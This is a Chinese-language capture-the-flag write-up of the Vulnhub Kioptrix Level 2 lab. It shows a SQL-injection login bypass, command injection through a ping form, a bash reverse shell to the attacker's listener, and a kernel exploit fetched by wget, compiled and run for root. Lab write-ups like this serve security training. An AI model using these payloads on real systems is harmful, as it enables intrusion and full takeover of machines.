---
title: Vulnhub-KIOPTRIX: LEVEL 2
date: 2024-01-26 
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/Kioptrix-level2.html"
---

# KIOPTRIX: LEVEL 2

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401261632087.png" alt="image-20240126104304145" style="zoom:50%;" />

老样子，对`.vmx`进行改造，然后扫描：

![image-20240126114005266](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401261632089.png)

## 踩点一下

打开看看对不对：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401261632090.png" alt="image-20240126114350440" style="zoom:50%;" />

尝试万能密码，`username`填入`admin' or '1' = '1`，进入了。好家伙直接免去了我最糟心的sql注入环节：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401261632091.png" alt="image-20240126115844210" style="zoom:67%;" />

然后随便ping一下，看看能不能执行命令`127.0.0.1 && whoami`，输出：

```text
127.0.0.1 && whoami

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.264 ms
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.034 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.032 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2000ms
rtt min/avg/max/mdev = 0.032/0.110/0.264/0.108 ms, pipe 2
apache
```

使用插件看一下相关配置信息：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401261632092.png" alt="image-20240126122344403" style="zoom: 50%;" />

## 端口扫描

```sh
sudo nmap -sS -T5 -A -p- 192.168.244.138
/*
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-25 23:07 EST
Nmap scan report for 192.168.244.138
Host is up (0.00067s latency).
Not shown: 65528 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
| ssh-hostkey: 
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
|_sshv1: Server supports SSHv1
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.0.52 (CentOS)
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1           1009/udp   status
|_  100024  1           1012/tcp   status
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
|_ssl-date: 2024-01-26T01:58:17+00:00; -2h09m35s from scanner time.
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_DES_64_CBC_WITH_MD5
631/tcp  open  ipp      CUPS 1.1
| http-methods: 
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
|_http-server-header: CUPS/1.1
1012/tcp open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)
MAC Address: 00:0C:29:12:F4:09 (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.30
Network Distance: 1 hop

Host script results:
|_clock-skew: -2h09m35s

TRACEROUTE
HOP RTT     ADDRESS
1   0.67 ms 192.168.244.138

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.59 seconds
*/
```

可以看到，开放了`22,80,111,443,631,1012,3306`这几个端口。

## 方法一：kali监听，反弹shell

```shell
127.0.0.1&&bash -i >& /dev/tcp/192.168.244.133/3380 0>&1
# bash -i >& /dev/tcp/192.168.244.133/3380 0>&1：这是一个反向 shell 命令的核心部分。
# bash -i：这会启动一个交互式的 bash shell。
# >& /dev/tcp/192.168.244.133/3380：这会将 bash shell 的输出重定向到 IP 地址 192.168.244.133 的 3380 端口。这意味着在 192.168.244.133 上监听 3380 端口的任何人都可以看到 bash shell 的输出。
# 0>&1：这会将 bash shell 的输入重定向到其输出，这意味着在 192.168.244.133 上监听 3380 端口的任何人都可以向 bash shell 发送命令。
```

本地开启一下监听：

```shell
nc -lvvp 3380
# nc：这是 netcat 的简写，是一个强大的网络工具，可以用于读取和写入网络连接。
# -l：这个参数让 netcat 进入监听模式，等待接入的连接。
# -v：这个参数让 netcat 在操作过程中提供更多的信息，也就是说它会显示更详细的输出。当你使用两个 -v 参数（即 -vv）时，netcat 会提供更详细的信息。
# -p 3380：这个参数指定 netcat 应该监听的端口号，这里是 3380。
```

进去了，拿到了一个普通用户权限：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401261632093.png" alt="image-20240126122158468" style="zoom:50%;" />

## 尝试提权

先寻找一下Apache相关漏洞查看是否有可以实现的：

![image-20240126122906650](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401261632094.png)

不对，我都反向连接shell了，我还要这个干啥。。。

尝试`SUID`提权：

```shell
┌──(kali㉿kali)-[~]
└─$ nc -lvvp 3380
listening on [any] 3380 ...
192.168.244.138: inverse host lookup failed: Unknown host
connect to [192.168.244.133] from (UNKNOWN) [192.168.244.138] 32771
bash: no job control in this shell
bash-3.00$ find / -perm -4000 2>/dev/null
/sbin/unix_chkpwd
/sbin/pam_timestamp_check
/sbin/pwdb_chkpwd
/usr/sbin/ccreds_validate
/usr/sbin/userhelper
/usr/sbin/userisdnctl
/usr/sbin/suexec
/usr/sbin/usernetctl
/usr/libexec/openssh/ssh-keysign
/usr/libexec/pt_chown
/usr/kerberos/bin/ksu
/usr/lib/squid/pam_auth
/usr/lib/squid/ncsa_auth
/usr/bin/chsh
/usr/bin/rcp
/usr/bin/sudo
/usr/bin/chage
/usr/bin/crontab
/usr/bin/rlogin
/usr/bin/rsh
/usr/bin/gpasswd
/usr/bin/at
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/lppasswd
/usr/bin/sg
/usr/bin/passwd
/bin/mount
/bin/traceroute6
/bin/traceroute
/bin/umount
/bin/ping6
/bin/ping
/bin/su
```

没有我们想要的文件。。。

尝试内核提权：

```shell
uname -a 	   #打印系统信息
lsb_release -a #查看系统版本
```

![image-20240126123958819](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401261632095.png)

可以看到 CentOS 版本为4.5，查找相关漏洞：

![image-20240126124416353](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401261632096.png)

第二个符合我们的系统，尝试下载下来利用一下：

```shell
searchsploit -m PATH
```

然后开启python的简单http服务：

```shell
python3 -m http.server 1234
```

然后在反弹shell中进行下载：

```shell
cd /tmp  								 # 防止没有读写权限
wget http://192.168.244.133:1234/9542.c  # 远程下载payload
gcc 9542.c  							 # 编译一下，这里有报错但是不影响
./a.out 								 # exploit
```

![image-20240126130302284](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401261632097.png)

如图已经拿到了root，打靶结束。